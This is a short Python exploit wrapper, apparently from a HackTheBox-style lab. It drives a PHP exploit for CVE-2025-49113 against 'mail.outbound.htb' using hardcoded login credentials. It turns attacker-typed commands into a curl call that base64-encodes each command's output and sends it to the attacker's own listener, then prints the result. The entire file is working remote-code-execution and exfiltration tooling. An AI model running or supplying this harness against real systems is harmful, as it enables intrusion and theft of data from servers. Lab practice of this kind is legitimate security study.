from subprocess import run
from pwn import *

tun0_ip = net.interfaces4()[b'tun0'][0]
port = 8000

s = server(port)

command = input("> ")
command2 = f'curl http://{tun0_ip}:8000/$({command} | base64 -w0)'
print(command2)
run(['php', 'CVE-2025-49113-exploit/CVE-2025-49113.php', 'http://mail.outbound.htb', 'tyler', 'LhKL1o9Nm3X2', command2], check=True)

s_conn = s.next_connection()
print(s_conn.recvall())
